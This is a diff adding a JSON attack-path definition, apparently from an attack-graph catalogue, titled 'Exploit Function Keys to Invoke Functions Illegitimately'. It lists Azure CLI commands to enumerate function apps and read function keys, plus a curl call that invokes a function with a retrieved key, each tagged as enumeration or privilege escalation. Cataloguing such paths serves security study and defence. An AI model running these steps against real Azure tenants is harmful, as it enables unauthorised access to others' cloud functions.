@@ -1,0 +1,47 @@
+{
+    "title": "Exploit Function Keys to Invoke Functions Illegitimately",
+    "icon": "https://img.icons8.com/?size=100&id=58079&format=png&color=000000",
+    "nodes": [
+        {
+            "id": 1,
+            "label": "Attacker",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/hacker.png",
+            "details": {}
+        },
+        {
+            "id": 2,
+            "label": "List Function Apps",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/list.png",
+            "details": {
+                "command": "az functionapp list --resource-group <ResourceGroupName>",
+                "description": "Lists all function apps in the specified resource group.",
+                "services": ["FunctionApp"],
+                "attack_types": ["Enumeration"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/functionapp?view=azure-cli-latest#az-functionapp-list"
+            }
+        },
+        {
+            "id": 3,
+            "label": "Get Function Keys",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/key.png",
+            "details": {
+                "command": "az functionapp function keys list --resource-group <ResourceGroupName> --name <AppName> --function-name <FunctionName>",
+                "description": "Lists the function keys for the specified function app.",
+                "services": ["FunctionApp"],
+                "attack_types": ["Privilege Escalation"],
+                "references": "https://docs.microsoft.com/en-us/cli/azure/functionapp/function/keys?view=azure-cli-latest#az-functionapp-function-keys-list"
+            }
+        },
+        {
+            "id": 4,
+            "label": "Invoke Function Illegitimately",
+            "icon": "https://img.icons8.com/ios-filled/50/000000/function.png",
+            "details": {
+                "command": "curl -H 'x-functions-key: <FunctionKey>' https://<AppName>.azurewebsites.net/api/<FunctionName>",
+                "description": "Invokes the specified function using the retrieved function key.",
+                "services": ["FunctionApp"],
+                "attack_types": ["Privilege Escalation"]
+            }
+        }
+    ]
+}
